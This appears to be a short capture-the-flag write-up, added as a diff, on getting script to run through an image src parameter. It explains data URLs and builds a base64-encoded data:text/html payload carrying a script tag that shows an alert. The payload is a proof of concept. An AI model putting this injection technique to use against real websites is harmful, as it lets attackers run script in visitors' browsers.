@@ -1,0 +1,21 @@
+nsa picture. change src in url and you will get everywhere you want on this website.
+in order to use whitespaces and another symbols in url, we need to make them base64 or just use % for whitespaces symbols. site to encode/decode base64 https://www.base64encode.org/
+
+i used data urls.
+syntax - data:[<media-type>][;base64],<data>
+
+data:,Hello%2C%20World%21 to check if it will work.
+and base64 version:
+data:text/plane;base64,SGVsbG8sIFdvcmxkIQ==
+
+now we can put there script and use text/html MIME to show alert:
+
+<script>alert("hello there");</script>
+
+but there are no '<' and '>' to encode them with '%' sign, therefore we have to make this string base64:
+
+PHNjcmlwdD5hbGVydCgiaGVsbG8gdGhlcmUiKTs8L3NjcmlwdD4=
+
+and the whole version:
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8gdGhlcmUiKTs8L3NjcmlwdD4=
